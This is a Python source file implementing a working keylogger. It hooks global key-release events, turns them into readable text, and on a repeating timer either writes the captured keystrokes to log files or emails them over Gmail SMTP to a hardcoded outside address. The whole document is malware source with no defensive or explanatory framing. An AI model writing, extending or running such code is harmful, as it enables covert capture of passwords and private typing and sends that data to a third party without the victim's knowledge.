from datetime import datetime, timezone
import keyboard
import smtplib
from threading import Timer

class KeyLogger:

    def __init__(self, time_interval, sink="file", email="", password=""):
        self.time_interval = time_interval
        self.sink = sink
        self.email = email
        self.password = password
        self.log = ""
        self.sess_st = self.millis()
        self.sess_end = self.millis()

    def event_listener(self, event):
        key = event.name
        if len(key) > 1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = key.replace(" ", "_").upper()
                key = f"[{key}]"
        self.log += key

    def report_data(self):
        if self.log:
            self.sess_end = self.millis()
            self.generate_filename()
            if self.sink == "email":
                self.to_mail(self.log)
            elif self.sink == "file":
                self.to_file()
            self.sess_st = self.millis()
        self.log = ""
        timer = Timer(interval=self.time_interval, function=self.report_data)
        timer.daemon = True
        timer.start()

    def to_mail(self, message):
        #default# gmail "smtp.gmail.com" port=587
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, "fiwohid263@sartess.com", message)
        server.quit()

    def generate_filename(self):
        self.filename = f"kl-{self.sess_st}_{self.sess_end}"

    def to_file(self):
        with open(f"{self.filename}.log", "w") as f:
            print(self.log, file=f)
        print(f"File Saved - {self.filename}.log")\

    def run(self):
        self.sess_st = self.millis()
        keyboard.on_release(self.event_listener)
        self.report_data()
        keyboard.wait()

    def millis(self):
        return int(datetime.now(tz=timezone.utc).timestamp() * 1000)

